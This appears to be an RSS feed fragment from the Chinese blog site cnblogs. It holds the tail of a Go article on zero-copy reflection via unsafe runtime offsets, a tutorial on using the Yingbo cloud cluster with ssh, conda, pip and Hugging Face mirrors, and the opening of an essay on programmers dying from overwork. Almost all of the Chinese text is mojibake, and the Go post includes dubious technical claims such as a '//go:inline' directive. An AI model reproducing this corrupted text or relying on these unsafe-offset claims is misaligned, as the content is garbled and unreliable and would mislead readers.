<th>åæ¬¡å¹³åèæ¶</th>
<th>æ§è½æå</th>
<th>åå­åé</th>
</tr>
</thead>
<tbody>
<tr>
<td>å®æ¹åå°å</td>
<td>132ms</td>
<td>132ns/æ¬¡</td>
<td>-</td>
<td>å¤§é</td>
</tr>
<tr>
<td>é¶æ·è´ä¼åæ¹æ¡</td>
<td>0.08ms</td>
<td>0.08ns/æ¬¡</td>
<td>çº¦1650å</td>
<td>å ä¹ä¸º0</td>
</tr>
</tbody>
</table>
<h3 id="46-æ ¸å¿ä¼åç¹">4.6 æ ¸å¿ä¼åç¹</h3>
<ol>
<li><strong>ä¸åéåç</strong>ï¼ä¸è®¾ç½® <code>StructField.Index</code> å­æ®µï¼é¿åæ¯æ¬¡é½åå»º <code>[]int{i}</code> åç</li>
<li><strong>å°æ·è´å­ç¬¦ä¸²</strong>ï¼<code>GetTag</code> å¨ä¸éè¦è½¬ä¹æ¶ç´æ¥è¿åå­ç¬¦ä¸²åçï¼é¿å <code>strconv.Unquote</code> çåå­åé</li>
<li><strong>ç¨åºå®åç§»é</strong>ï¼<code>abiTypeSize = 48</code> å¸¸éï¼ç´æ¥å®ä½å° <code>structType</code> çèµ·å§å°å</li>
<li><strong>åèä¼å</strong>ï¼æææ ¸å¿æ¹æ³é½ç¨äº <code>//go:inline</code>ï¼åå°å½æ°è°ç¨å¼é</li>
</ol>
<h2 id="äºå®å¨æ§åå¼å®¹æ§">äºãå®å¨æ§åå¼å®¹æ§</h2>
<h3 id="51-å®å¨æ§">5.1 å®å¨æ§</h3>
<ul>
<li><strong>åªè¯»æä½</strong>ï¼æææä½é½æ¯è¯»åªè¯»åå­ï¼ä¸ä¼æ¹åå§æ°æ®</li>
<li><strong>åºå®åç§»é</strong>ï¼åºäºGo1.14+çç¨³å®åå­å¸å±ï¼ä¸ä¼è¶ç</li>
<li><strong>ç±»åæ ¡éª</strong>ï¼æä½åé½ä¼æ£æ¥ç±»åæ¯ä¸æ¯ç»æä½</li>
</ul>
<h3 id="52-å¼å®¹æ§">5.2 å¼å®¹æ§</h3>
<ul>
<li><strong>Go1.14+</strong>ï¼éç¨äºGo1.14åä»¥ä¸çæ¬ï¼å ä¸º <code>abi.Type</code> çåå­å¸å±ä»1.14å¼å§åºå®</li>
<li><strong>è·¨å¹³å°</strong>ï¼64ä½æ¶æï¼amd64/arm64ï¼ä¸ï¼<code>abiTypeSize = 48</code> æ¯åºå®ç</li>
</ul>
<h2 id="å­æ»ç»">å­ãæ»ç»</h2>
<p>éè¿ç´æ¥æä½ <code>runtime</code> å±ç <code>abi.Type</code> ç»æä½ï¼å®ç°äºé¶æ·è´çåå°ä¼åï¼</p>
<ol>
<li><strong>æ ¸å¿æè·¯</strong>ï¼ç»å¼ <code>reflect</code> åçå°è£ï¼ç´æ¥è®¿é®åºå± <code>abi.Type</code></li>
<li><strong>å³é®ææ¯</strong>ï¼åºå®åç§»é + unsafe æä½ + é¿åæ æä¹çåå­åé</li>
<li><strong>æ§è½æå</strong>ï¼æ¯å®æ¹åå°åå¿«1000+åï¼åå­åéå ä¹ä¸ºé¶</li>
</ol>
<p>è¿ä¸ªæ¹æ¡éç¨äºé«é¢åå°åºæ¯ï¼åORMãåºååæ¡æ¶è¿äºå°æ¹ï¼è½æ¾èæåæ§è½ã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-30 22:01">2026-01-30 22:01</span>&nbsp;
<a href="https://www.cnblogs.com/fgaoxing">Fgaoxing</a>&nbsp;
éè¯»(<span id="post_view_count">46</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19555877);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19555877', targetLink: 'https://www.cnblogs.com/fgaoxing/p/19555877', title: 'Goåå°ï¼æ§è½ç¶é¢ä¸é¶æ·è´ä¼å' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä»¥è±åäºä¸ºä¾ä»ç»éç¾¤äºæå¡å¨çä½¿ç¨ ]]></title>
    <link>https://www.cnblogs.com/RunfarAI/p/19555772</link>
    <guid>eb48dec12e5abadac865291ff2654342</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/RunfarAI/p/19555772" title="åå¸äº 2026-01-30 21:23">
    <span role="heading" aria-level="2">ä»¥è±åäºä¸ºä¾ä»ç»éç¾¤äºæå¡å¨çä½¿ç¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#åºæ¬å³ç³»" rel="noopener nofollow">åºæ¬å³ç³»</a></li><li><a href="#å¼åæºä½¿ç¨" rel="noopener nofollow">å¼åæºä½¿ç¨</a></li><li><a href="#å¼åç¯å¢ç" rel="noopener nofollow">å¼åç¯å¢ç</a></li><li><a href="#ç¯å¢éç½®" rel="noopener nofollow">ç¯å¢éç½®</a><ul><li><a href="#æ´æ¹condaçç¯å¢å­æ¾ä½ç½®" rel="noopener nofollow">æ´æ¹condaçç¯å¢å­æ¾ä½ç½®</a></li><li><a href="#æ´æ¹pipç¼å­çå­æ¾ä½ç½®" rel="noopener nofollow">æ´æ¹pipç¼å­çå­æ¾ä½ç½®</a></li></ul></li><li><a href="#å±äº«å­å¨å·" rel="noopener nofollow">å±äº«å­å¨å·</a></li><li><a href="#éè¿huggingface_cliä¸è½½æ¨¡ååæ°æ®é" rel="noopener nofollow">éè¿huggingface_cliä¸è½½æ¨¡ååæ°æ®é</a></li><li><a href="#å éè®¿é®" rel="noopener nofollow">å éè®¿é®</a><ul><li><a href="#hfdaria2" rel="noopener nofollow">hfd+aria2</a></li><li><a href="#ä¸æ­¥å°ä½è±åäºåç½®å éæå¡" rel="noopener nofollow">ä¸æ­¥å°ä½ââè±åäºåç½®å éæå¡</a></li></ul></li></ul></div><p></p>
<h1 id="åºæ¬å³ç³»">åºæ¬å³ç³»</h1>
<p>éç¾¤ä¸ç®¡ççå¤ä¸ªå¼åæºï¼å¼åæºæ¯ç¨æ·ä½¿ç¨è®¡ç®èµæºçåºæ¬åä½ãæ¯ä¸ªéç¾¤æèªå·±çå±äº«å­å¨å·ãåå­å¨å·ä»¥åå¯¹è±¡å­å¨å·ãä¸åéç¾¤çå­å¨ä¸å±äº«ã</p>
<p>å±äº«å­å¨å·ä¸è¬å­æ¾æ°æ®éä¹ç±»çå¤§åè®­ç»æ°æ®ï¼å¯æè½½å°å¤ä¸ªå¼åæºï¼åå­å¨ä¸è¬åªæè½½å°ä¸ä¸ªå¼åæºãå¯¹è±¡å­å¨ä¸»è¦æ¯å­æµ·ééç»æåæ°æ®ï¼å¦å¾çãé³é¢ãè§é¢ãææ¬ç­ã</p>
<h1 id="å¼åæºä½¿ç¨">å¼åæºä½¿ç¨</h1>
<p>ä»ç»ä¸¤ç§å¸¸ç¨çä½¿ç¨æ¹å¼ãæ¹å¼ä¸ï¼å¼æºåä½¿ç¨å¼åæºèªå¸¦çJupyterï¼å³ç¹å»JupyterLabãå¨JupyterLabéå¯ä»¥éè¿è¿ä¸ªæé®ä¸ä¼ æä»¶ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun1.png" alt="" loading="lazy"></p>
<p>ç¶åçº¢æ¡å·¦è¾¹çæé®æ¯åå»ºæ°çç®å½ï¼çº¢æ¡å³è¾¹æ¯å·æ°ï¼èè²å å·æ¯æå¼æ°çJupyteré¡µé¢ã</p>
<p>æ¹å¼äºï¼ç¨ssh+VSCodeè¿æ¥ãå¨VSCodeæç´¢å¦ä¸ä¸¤ä¸ªæä»¶ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun2.png" alt="" loading="lazy"></p>
<p><img src="https://yunhdan.github.io/assets/yingboyun3.png" alt="" loading="lazy"></p>
<p>å®è£å®æ¯åéå¯VSCodeï¼ç¹å»å·¦ä¾§çè¿ç¨èµæºç®¡çå¨æå¼sshæå¡å¨éæ©æ ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun4.png" alt="" loading="lazy"></p>
<p>ç¹ä¸­å å·ï¼å¢å è¿ç¨æå¡å¨ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun5.png" alt="" loading="lazy"></p>
<p>æå¼è±åäºçå¼åæºé¡µé¢ï¼ç¹å»å¼åæºçè¿ç¨è¿æ¥ï¼å¤å¶ç»éæ¹å¼å½ä»¤ï¼<br>
<img src="https://yunhdan.github.io/assets/yingboyun6.png" alt="" loading="lazy"></p>
<p>ç²è´´å°å¼¹çªï¼<br>
<img src="https://yunhdan.github.io/assets/yingboyun7.png" alt="" loading="lazy"></p>
<p>éæ©è¦æ´æ°çsshéç½®æä»¶ï¼æ²¡æå°±èªå·±åå»ºä¸ä¸ªï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun8.png" alt="" loading="lazy"></p>
<p>å¨å¼¹åºçéç½®é¡µé¢ä¸­éç½®sshï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun9.png" alt="" loading="lazy"></p>
<p>Hostæ¯è¿ç¨æå¡å¨åå­ï¼å¯ä»¥èªå·±åãåå¦æä»¬å¤å¶çsshç»å½æ¹å¼æ¯ï¼<code>ssh -p 39000 root@ssh-cn-huabei1.ebcloud.com</code>ï¼é£ä¹HostNameå°±æ¯@åé¢çåå®¹ï¼Portæ¯ssh - påé¢çæ°å­ï¼Useræ¯@åé¢çrootã</p>
<p>ä¿å­åéåºï¼ç¹å»ç®­å¤´è¿å¥è¿æ¥ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun10.png" alt="" loading="lazy"></p>
<p>ä¼è¦æ±éæ©è¿ç¨å¹³å°ç±»åï¼éæ©Linuxï¼ç¶åä¼å¼¹åºææçº¹ï¼ç¹å»ç»§ç»­åè¿å¥å¯ç è¾å¥ï¼å¤å¶è±åäºå¼åæºè¿ç¨è¿æ¥çç»å½å¯ç ç¶åç²è´´è¿å»å³å¯è¿æ¥ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun12.png" alt="" loading="lazy"></p>
<h1 id="å¼åç¯å¢ç">å¼åç¯å¢ç</h1>
<p>ç³»ç»çé»è®¤æè½½å°rootç®å½ï¼è¿å¥rootç®å½ä¼çå°miniconda3å·²ç»å®è£å¥½ï¼ä¹åconda createçèæç¯å¢ä¼å®è£å°miniconda3/envsä¸­ï¼pipçç¼å­ä¹å¨rootç®å½ä¸ã</p>
<p>ç¶èç³»ç»çåªæ30Gï¼å°æ¥åå»ºæ´å¤èæç¯å¢æ¶ï¼è¿ç¹ç©ºé´æ¯è¯å®ä¸å¤çãå æ­¤æ¨èå°pipç¼å­ä»¥åèæç¯å¢çä½ç½®æ´æ¹å°å¶ä»å°æ¹ã</p>
<p>æä»¬å¨è±åäºå¼ä¸ä¸ªåå­å¨å·ï¼ä¸é¨æ¾ç½®ç¯å¢ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun11.png" alt="" loading="lazy"></p>
<p>å­å¨ç©ºé´å¯ä»¥åå¤§äºï¼æ¯å¦64Gã128Gãç¶åå°å¼åæºä¸­æ´æ¹å®ä¾éç½®ï¼ä¸æ»å°å­å¨éç½®ï¼å¨åå­å¨å·ä¸­æè½½ä½ æ°å¼çå­å¨å·ï¼ç¶åæè½½è·¯å¾èªå®ï¼ä¹åå¨è¿ä¸ªè·¯å¾æ¾ä¸è¥¿å°±ç¸å½äºæ¾å°è¿ä¸ªæ°çã</p>
<blockquote>
<p>ä¸ºä»ä¹è¦å¼ä¸ä¸ªæ°çæ¾ç¯å¢å·²ç»è®²æ¸æ¥äºãé£ä¹ä¸ºä»ä¹éæ©åå­å¨å·èä¸æ¯å±äº«å­å¨å·æ¾ç½®ç¯å¢ï¼è¿æ¯å ä¸ºä¸ä¸ªåå­å¨å·åªè½æè½½å°ä¸ä¸ªå¼åæºï¼ä¹å°±æ¯è¯´å¦æä½ æè¿ä¸ªæ°çæè½½å°ä½ çå¼åæºï¼é£ä¹å¶ä»å¼åæºå°±æ æ³åè®¿é®è¿ä¸ªççæ°æ®ï¼å°±è½å¤é¿åäºç¯å¢è¢«å¶ä»å¼åæºå é¤çæåµï¼èä¸åè®¸äºä¸åçå¼åæºæä¸åçèæç¯å¢åã</p>
</blockquote>
<blockquote>
<p>å¦æå·²ç»å¼è¿ä¸ä¸ªç¯å¢çï¼è¿æç©ºé´çè¯ï¼é£å°±ä¸ç¨åå¼äºï¼è¿éæ¯éå¯¹æ°åå»ºæºå¨çã</p>
</blockquote>
<h1 id="ç¯å¢éç½®">ç¯å¢éç½®</h1>
<h2 id="æ´æ¹condaçç¯å¢å­æ¾ä½ç½®">æ´æ¹condaçç¯å¢å­æ¾ä½ç½®</h2>
<p>è¿å¥æ ¹ç®å½ä¸çcondaç®å½ï¼éå¸¸å«miniconda3æèanaconda3ï¼ï¼å¨è¯¥çº§ç®å½ä¸æ¾å°<code>.condarc</code>è¿ä¸ªæä»¶ï¼æ·»å å¦ä¸åå®¹ï¼</p>
<pre><code class="language-raw">envs_dirs:
  - /data/envs
</code></pre>
<p>/data/envsæ¯ä½ èªå®ä¹çå­æ¾èæç¯å¢çä½ç½®ï¼ä¸è¬æ¯å¨åé¢æ°ççæè½½è·¯å¾ä¸ãä¿å­åï¼ä»¥ååå»ºèæç¯å¢å°±è½èªå¨å¨è¿ä¸ªç®å½ä¸åå»ºäºãåæ¶ï¼ä½ å¯ä»¥æèæç¯å¢envç®å½ç§»å¨å°è¿ä¸ªèªå®ä¹çä½ç½®ï¼condaä¹ä¼è¯å«å°èæç¯å¢ã</p>
<p>è¿æ ·ï¼å¤ä¸ªèæç¯å¢å°±ä¼å®è£å°åå­å¨å·ä¸­ï¼é¿åäºç³»ç»ççèè¿ã</p>
<h2 id="æ´æ¹pipç¼å­çå­æ¾ä½ç½®">æ´æ¹pipç¼å­çå­æ¾ä½ç½®</h2>
<p>pipçç¼å­æ¯å¨å±çï¼ä¹å°±æ¯è¯´ææçèæç¯å¢çpipç¼å­é½å°å­æ¾å°ä¸ä¸ªå°æ¹ï¼ä¸è¬é»è®¤å­æ¾å°æ ¹ç®å½rootä¸ç<code>.cache</code>ç®å½ä¸ãè¿æ¶å¯ä»¥éè¿å¦ä¸å½ä»¤æ´æ¹pipç¼å­çå­æ¾ä½ç½®ï¼</p>
<pre><code class="language-bash">pip config set global.cache-dir "/home/your_path"
</code></pre>
<p>æèè¿å¥æ ¹ç®å½ä¸ç<code>.config/pip</code>ç®å½ï¼æ¾å°pip.confæä»¶ï¼æå¼å¯ä»¥åç°æå¦ä¸åå®¹ï¼</p>
<pre><code class="language-raw">[global]
cache-dir = /data/pip_cache
</code></pre>
<p>å¨cache-dirå­æ®µæ´æ¹ä¸ºèªå®ä¹çè·¯å¾ä½ç½®å³å¯ã</p>
<p>å¦æä½ æ³æ¢å¤é»è®¤è®¾ç½®ï¼å¯ä»¥ä½¿ç¨ä»¥ä¸å½ä»¤ï¼</p>
<pre><code class="language-bash">pip config unset global.cache-dir
</code></pre>
<blockquote>
<p>åæ ·ï¼å¦æä¹åå·²ç»æ´æ¹è¿äºéç½®çå¼åæºï¼å°±æ²¡å¿è¦åæ´æ¹äºã</p>
</blockquote>
<h1 id="å±äº«å­å¨å·">å±äº«å­å¨å·</h1>
<p>ç¡®ä¿ä½ çå¼åæºåå¥½äºå±äº«å­å¨å·çæè½½ï¼æå¼å¼åæºçå®ä¾éç½®ï¼ä¸æ»å°å­å¨éç½®ï¼</p>
<p><img src="https://yunhdan.github.io/assets/yingboyun13.png" alt="" loading="lazy"></p>
<p>æ·»å å±äº«å­å¨å·åï¼ä¸ºå¶å®ä¹æè½½è·¯å¾ï¼è¿æ ·ä¹åä»£ç åæ°æ®éå¯ä»¥æ¾å°å¼åæºçè¿ä¸ªè·¯å¾ä¸ã</p>
<p>å³äºå±äº«å­å¨å·ï¼å»ºè®®æ¯ä¸ªäººç¨èªå·±çæ¼é³åæ¥å½åèªå·±çæä»¶å¤¹ï¼ç¶åå¨è¿ä¸ªèªå·±çæä»¶å¤¹ä¸æ¾èªå·±çæ°æ®ï¼è¿æ ·ä¾¿äºæ¥æ¾ï¼é²æ­¢å²çªã</p>
<h1 id="éè¿huggingface_cliä¸è½½æ¨¡ååæ°æ®é">éè¿huggingface_cliä¸è½½æ¨¡ååæ°æ®é</h1>
<p>é¤äºç´æ¥å°ç½é¡µç«¯ç¹å»ä¸è½½æé®ä¹å¤ï¼è¿å¯ä»¥å¨ç»ç«¯ç¨å½ä»¤è¡çæ¹å¼ä¸è½½æ°æ®éåæ¨¡åã</p>
<p>é¦ååºè¯¥å®è£huggingface_hubå·¥å·ï¼</p>
<pre><code class="language-bash">pip install -U huggingface_hub
</code></pre>
<p>huggingface-cliå·²ç»å¼ç¨ï¼huggingface-cliå·²ç»æ´æ°ä¸ºhfå½ä»¤ãå³äºhfå½ä»¤æåªäºååï¼å¯ä»¥èèå­¦ä¹ è¿ç¯æç« ï¼<a href="https://zhuanlan.zhihu.com/p/663712983?s_r=0%E3%80%82" target="_blank" rel="noopener nofollow">https://zhuanlan.zhihu.com/p/663712983?s_r=0ã</a></p>
<p>å¨Windowsï¼ä½ å¯ä»¥ä¾æ¬¡æ§è¡ï¼</p>
<pre><code class="language-bash">$env:HF_ENDPOINT = "https://hf-mirror.com"
hf download --resume-download [model name] --local-dir [save location]
</code></pre>
<p>å¨æ¬å·åæ¿æ¢ä¸ºå·ä½çåå®¹ãmodel nameæ¯huggingfaceæä¸ªä»åºå·ä½çåå­ï¼æ¯å¦ä¸é¢ç<code>ShengbinYue/DISC-Law-SFT</code>ãsave locationåæ¯ä¿å­å°æ¬å°çç®å½åã</p>
<p><img src="https://yunhdan.github.io/assets/huggingface1.png" alt="" loading="lazy"></p>
<p>ä¸è½½æ°æ®éçå½ä»¤åæ¯å¨åé¢ä¸è½½æ¨¡åçå½ä»¤å¢å <code>--repo-type dataset</code>åæ°ãå¨Linuxå¹³å°ï¼ä½ å¯ä»¥èèææ§è¡<code>$env:HF_ENDPOINT = "https://hf-mirror.com</code>æ¢ææ§è¡ï¼</p>
<pre><code class="language-bash">export HF_ENDPOINT="https://hf-mirror.com"
</code></pre>
<blockquote>
<p>$env:HF_ENDPOINT = "<a href="https://hf-mirror.com" target="_blank" rel="noopener nofollow">https://hf-mirror.com</a>" å export HF_ENDPOINT="<a href="https://hf-mirror.com" target="_blank" rel="noopener nofollow">https://hf-mirror.com</a>" çç®çå°±æ¯å¨äºè§£å³å½åè®¿é®huggingfaceæå¡å¨å¤±è´¥çé®é¢ãè®¾ç½®è¿å½ä»¤å°±æ¯æä¾ä¸ä¸ªéåä»¥ä¾¿æ´å¿«å°è®¿é®ï¼è¿ä¸ªæ¯å®æ¹çéåï¼éåº¦å¿«ã</p>
</blockquote>
<h1 id="å éè®¿é®">å éè®¿é®</h1>
<p>å¦æä½ åç°ä¸é¢çæ¹æ³ä¸è½½éåº¦è¿æ¯å¾æ¢ï¼ä½ å¯ä»¥åèä¸é¢çåæ³ã</p>
<h2 id="hfdaria2">hfd+aria2</h2>
<p>é¦åä¸è½½hfdåaria2cï¼</p>
<pre><code class="language-bash">wget https://hf-mirror.com/hfd/hfd.sh
chmod a+x hfd.sh

sudo apt-get install aria2
sudo apt-get install git-lfs
</code></pre>
<p>hfdè¿ç©æé»è®¤å®è£å°å½åè·¯å¾ä¸ã</p>
<p>è®¾ç½®ç¯å¢åéï¼</p>
<pre><code class="language-bash">export HF_ENDPOINT=https://hf-mirror.com
</code></pre>
<p>ä¸è½½æ¨¡å/æ°æ®éï¼</p>
<pre><code class="language-bash">./hfd.sh [model/datasets] --tool aria2c -x 8
</code></pre>
<h2 id="ä¸æ­¥å°ä½è±åäºåç½®å éæå¡">ä¸æ­¥å°ä½ââè±åäºåç½®å éæå¡</h2>
<p>ç¡®ä¿å®è£å¥½äºhfdåaria2cï¼æ²¡æå°±çä¸é¢åå®è£å¥½ã</p>
<p>æ­¤æ¶<strong>ä¸</strong>è®¾ç½®ç¯å¢åé<code>export HF_ENDPOINT=https://hf-mirror.com</code>ãå¨ç»ç«¯è¾å¥å½ä»¤ï¼</p>
<pre><code class="language-bash">source /public/bin/network_accelerate
</code></pre>
<p>è¿ä¸ªå½ä»¤å¯ä»¥å¨å½åç»ç«¯æå¼è±åäºçå éæå¡ï¼æ¯æè®¿é®githubãhuggingfaceãwandbç­ã</p>
<p>åæ¶å éçå½ä»¤å¯åèï¼</p>
<pre><code class="language-bash">source /public/bin/network_accelerate_stop
</code></pre>
<p>è®¾ç½®äºå éåï¼åè¾å¥ä¸è½½å½ä»¤ï¼</p>
<pre><code class="language-bash">./hfd.sh [model/datasets] --tool aria2c -x 8
</code></pre>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.14097222222222222" data-date-updated="2026-01-31 00:46">2026-01-30 21:23</span>&nbsp;
<a href="https://www.cnblogs.com/RunfarAI">RunfarAI</a>&nbsp;
éè¯»(<span id="post_view_count">30</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19555772);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19555772', targetLink: 'https://www.cnblogs.com/RunfarAI/p/19555772', title: 'ä»¥è±åäºä¸ºä¾ä»ç»éç¾¤äºæå¡å¨çä½¿ç¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ çäºï¼å³äº2026å¼å¹´3ä½ç¨åºåæ¥è¿çæ­»äºä»¶å¯¹æ®éäººçå¯ç¤ºå½ä¸ ]]></title>
    <link>https://www.cnblogs.com/philry/p/19540878</link>
    <guid>951d13ca699390c5b0b08f764ffc368a</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/philry/p/19540878" title="åå¸äº 2026-01-30 19:11">
    <span role="heading" aria-level="2">çäºï¼å³äº2026å¼å¹´3ä½ç¨åºåæ¥è¿çæ­»äºä»¶å¯¹æ®éäººçå¯ç¤ºå½ä¸</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<h1 class="md-end-block md-heading md-focus"><span class="md-plain md-expand">çäºï¼å³äº2026å¼å¹´3ä½ç¨åºåæ¥è¿çæ­»äºä»¶å¯¹æ®éäººçå¯ç¤ºå½ä¸</span></h1>
<h3 class="md-end-block md-heading"><span class="md-plain"><img alt="çæå¾®ä¿¡å¬ä¼å·å°é¢" width="563" height="289" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2337379/202601/2337379-20260127224212756-1168211141.png" class="lazyload"></span></h3>
<h3 class="md-end-block md-heading"><span class="md-plain">çäºï¼ï¼ï¼</span></h3>
<p class="md-end-block md-p"><span class="md-plain">æ­¤åï¼æåå¸çé£ç¯ãç ´é²äºï¼2026å¼å¹´3ä½ç¨åºåæ¥è¿çæ­»ï¼æå¹´è½»26å²ï¼29å²ç·ä¸»ç¦»ä¸æ¶ï¼å¦»å­æ­£æäºè7ä¸ªæâ¦ãï¼æå¤å¼çäºå¨ç½å±é¸£ï¼è¯è®ºåºæäºè¯¸å­ç¾å®¶äºé¸£ç°åºï¼å¤§å®¶çº·çº·å¨è¯è®ºåºè¡¨è¾¾èªå·±çè§ç¹ãçæ³ååæã</span></p>
<h4 class="md-end-block md-heading"><span class="md-plain">åå°å ç¾æ¡çè¨ãè¯è®ºåºä¸åæ¡ç­è®®ï¼åæ½®æ°´ä¸æ ·æ¶æ¥ï¼ææ¿ççäºæ§ï¼ææ å³çè°ä¾ï¼ä¹æå¯å¯éº»éº»çå¿ç¼ãæåèº«åçæ å¥ï¼è¿æèå¨å­éè¡é´çèªæåæã</span></h4>
<p class="md-end-block md-p"><span class="md-plain">æäººè¯´ï¼âççé£äºç»èï¼ä»¿ä½çå°äºå ç­å°æ·±å¤çèªå·±âï¼æäººè¯´ï¼âæä¹æ¯ç¨åºåï¼æ¯å¤©è¢«bugãKPIè¿½çè·ï¼è¿å¥½å¥½åä¸é¡¿é¥­ãç¡ä¸è§é½æäºå¥¢æâï¼ä¹æäººè¯´ï¼âåæ¥æä»¬æ¼å½åªåæ³è¦å®æ¤çå®¶ï¼ä»æ¥é½ä¸éè¦ç¨çå½å»æ¢âãè¯è®ºåºå°±åä¸ä¸ªåå¤§çæç»ªåºå£ï¼å®¹çº³çæ æ°ä¸ªå¨çæ´»éå¥åå¥è·ãé»é»éæ¯çæ®éäººï¼å¤§å®¶éçå±å¹ï¼è¯è¯´çèªå·±çèåºå°å¢ãçæ´»ååï¼ä¹å¨è¿ä¸èµ·ä»¤äººå¿ç¢çæ²å§éï¼çè§èªå·±çå½±å­ï¼è¯»æäºææ²éçè­¦ç¤ºã</span></p>
<p class="md-end-block md-p md-focus"><span class="md-plain">2026å¹´ï¼æååæå¼åºå¹ï¼å¹´å³è¿æ²¡æ¥å¾åå¼¥æ¼«ï¼æä»¬å°±æ¥è¿æ¶å°äºä¸ä¸ªä»¤äººçªæ¯çå©èãç­ç­äºåå¤å¤©éï¼ä¸ä½å¹´è½»çç¨åºåï¼ç¸ç»§åå¨äºèªå·±çâæåºâä¸ââä»ä»¬ä¸æ¯å°å·çæ°é»æ°å­ï¼ä¸æ¯è¢«æ¿æ¥è®¨è®ºçè¯é¢ï¼æ¯ä¸ä¸ªå®¶åº­çé¡¶æ¢æ±ï¼æ¯å¹´è¿ç¶æ¯çå¿å¤´èï¼æ¯å¦»å­çä¾é ï¼æ¯å­©å­çå¨ä¸çãä»ä»¬ä¸­ï¼æå¹´è½»çåªæ26å²ï¼è¿æ²¡æ¥å¾åå¥½å¥½æåéæ¥çç­çï¼æ²¡æ¥å¾åå®ç°èªå·±çå°æ¢¦æ³ï¼å°±åååå«äºè¿ä¸ªä¸çï¼32å²çé«å¹¿è¾ï¼ä»æ¡åå¾æ¢é¶ç¨é±çå°å¹´ï¼æ¼å°½å¨åèä¸å¤§å­¦ãææ¼äºä¸ï¼æåä¸ºé¨é¨ç»çï¼æéæ¡çâç¼ç¨é©¬ææ¾âçå¥çï¼å¿éè£çå¯¹å®¶åº­çè´£ä»»ï¼å´å¨ä¸ä¸ªæ®éçå¨æ«ï¼å ä¸ºé¿æé«å¼ºåº¦å ç­ï¼æ°¸è¿å°åå¨äºæ¢æå®¤éï¼è29å²çå­æï¼ç¦»ä¸æ¶ï¼å¦»å­æ­£æç7ä¸ªæçäºèï¼å®¶éè¿æäºå²çå¥³å¿åä½å¼±å¤çãé ä½ä¿åº¦æ¥çèç¶äº²ï¼ä»æ¼å°½å¨åæ³ç»å®¶äººæ´å¥½ççæ´»ï¼å´æ²¡æ³å°ï¼èªå·±ççªç¶ç¦»å»ï¼ç»è¿ä¸ªæ¬å°±ä¸å¯è£çå®¶ï¼å¤äºâæ­»åâã</span></p>
<p class="md-end-block md-p"><span class="md-plain">æè³ä»è®°å¾ï¼é«å¹¿è¾ç¦»ä¸é£å¤©çç»èï¼æ¯æ³ä¸æ¬¡ï¼é½å¿ä¸ä½çº¢äºç¼ç¶ãé£æ¯ä¸ä¸ªå¨å­ï¼æ¬è¯¥æ¯ä¼æ¯çæ¥å­ï¼å¯ä»çæ¥ç¨è¡¨ä¸ï¼è¿æåé¡¹å·¥ä½ä»»å¡è¦å¨å½å¤©å®æãæ¸æ¨ï¼ä»èµ·åºåå°±è§å¾èº«ä½ä¸èæï¼å´è¿æ¯å¼ºæçï¼è·å¦»å­è¯´âåä¸ä¼å¿ï¼é¡ºä¾¿å¤çä¸å·¥ä½âï¼çè³å¨å¦»å­æåºå¸¦ä»å»å»é¢æ¶ï¼ä»è¿æ³çâåºè¯¥ä¸ä¸¥éï¼ä½å å¤©é¢å°±å¥½ï¼æçµèå¸¦ä¸å§âââä»å°æåä¸å»ï¼é½æ²¡ææ¾ä¸æéçå·¥ä½ï¼æ²¡ææ³è¿ï¼èªå·±çèº«ä½ï¼æ©å·²è¢«æ¥å¤ä¸æ¥çç¬å¤ãæ ä¼æ­¢çå ç­ï¼éæ¯å°äºæéã</span></p>
